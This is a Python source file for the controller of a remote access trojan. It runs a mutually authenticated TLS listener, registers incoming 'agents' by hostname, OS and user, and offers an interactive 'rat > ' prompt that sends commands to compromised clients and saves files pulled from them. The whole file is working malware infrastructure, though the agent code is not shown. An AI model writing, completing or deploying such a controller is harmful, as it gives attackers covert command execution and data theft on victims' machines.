# écouter sur un port
# accepter connexions
# lancer threads
import socket
import ssl
from threading import Thread
from utils.logger import setup_logger
import json

logger = setup_logger()


class SSLServer:
    def __init__(
        self, host, port, server_cert, server_key, client_cert, chunk_size=1024
    ):
        self.host = host
        self.port = port
        self.chunk_size = chunk_size
        self._context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self._context.verify_mode = ssl.CERT_REQUIRED
        self._context.load_cert_chain(server_cert, server_key)
        self._context.load_verify_locations(client_cert)

    def connect(self):

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:

            sock.bind((self.host, self.port))

            sock.listen(5)

            print("Server listening")
            logger.info("Server listening")
            while True:

                conn, addr = sock.accept()

                try:

                    sconn = self._context.wrap_socket(
                        conn,
                        server_side=True,
                    )

                    print("Client connected:", addr[0])
                    logger.info("Client connected: %s", addr[0])

                    data = sconn.recv(self.chunk_size)

                    client_info = json.loads(data.decode())

                    logger.info(
                        "New agent: %s | %s | %s | %s",
                        client_info["hostname"],
                        client_info["os"],
                        client_info["user"],
                        client_info["release"],
                    )

                    Thread(
                        target=self._handle_client,
                        args=(sconn,),
                        daemon=True,
                    ).start()

                except ssl.SSLError:

                    print("SSL handshake failed")
                    logger.error("SSL handshake failed")

    def _recv(self, sock):

        try:

            while True:

                data = sock.recv(self.chunk_size)

                if not data:
                    print("Client disconnected")
                    logger.warning("Client disconnected")
                    break

                print(data.decode())

        except ConnectionResetError:

            print("Client forcibly closed connection")
            logger.warning("Client forcibly closed connection")

        except ssl.SSLError:

            print("SSL error")
            logger.error("SSL error")
        except Exception as e:

            print(f"Error: {e}")

        finally:

            sock.close()

    def _save_download(self, response):

        try:

            lines = response.split("\n")

            if lines[0] != "OK":
                print(response)

                return

            content = "\n".join(lines[1:-1])

            filename = "downloaded_file"

            with open(filename, "w") as f:

                f.write(content)

            print(f"File saved: {filename}")

        except Exception as e:

            print("Download save error:", e)

    def _recv_until_eof(self, sock):

        buffer = ""

        while True:

            chunk = sock.recv(self.chunk_size)

            if not chunk:
                break

            buffer += chunk.decode(errors="ignore")

            if "EOF" in buffer:
                break

        return buffer

    def _handle_client(self, sock):

        logger.info("Client handler started")

        try:

            while True:

                command = input("rat > ")

                if not command:
                    continue

                sock.sendall((command + "\n").encode())

                logger.info("Server sent command: %s", command)

                response = self._recv_until_eof(sock)

                if not response:
                    logger.warning("Client disconnected")

                    break

                if response.startswith("OK\n"):

                    self._save_download(response)

                else:

                    print(response)

                logger.info("Client responded: %s", response)

        except Exception as e:

            logger.error("Client handler error: %s", e)

        finally:

            logger.info("Closing client socket")

            sock.close()


class SSLServerThread(Thread):
    def __init__(self, server):
        super().__init__()
        self._server = server
        self.daemon = True

    def run(self):
        self._server.connect()
